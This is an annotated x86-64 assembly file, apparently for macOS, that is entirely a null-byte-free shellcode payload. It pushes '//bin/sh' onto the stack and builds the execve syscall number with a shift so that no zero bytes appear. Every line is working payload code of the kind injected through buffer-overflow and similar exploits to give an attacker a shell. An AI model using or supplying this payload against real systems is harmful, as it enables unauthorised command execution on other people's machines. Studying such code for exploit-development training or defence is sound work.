; non-NULL shellcode
global start
section .text

start:
  ; call execve(program, NULL)
  xor  rdx, rdx                ; zero out RDX
  push rdx                     ; push NULL on stack
  mov  rdi, 0x68732f6e69622f2f ; move "//bin/sh" string (reversed) to RDI
  push rdi                     ; push rdi to the stack
  mov  rdi, rsp                ; store RSP (points to the command string) in RDI
  xor  rsi, rsi                ; zero out RSI
  xor  rax, rax                ; zero out RAX
  mov  al, 2                   ; put 2 to AL -> RAX = 0x0000000000000002
  shl  eax, 0x18               ; shift the 2 -> RAX = 0x0000000002000000
  mov  al, 0x3b                ; move 3b to AL (execve SYSCALL#) -> RAX = 0x000000000200003b
  syscall                      ; trigger syscall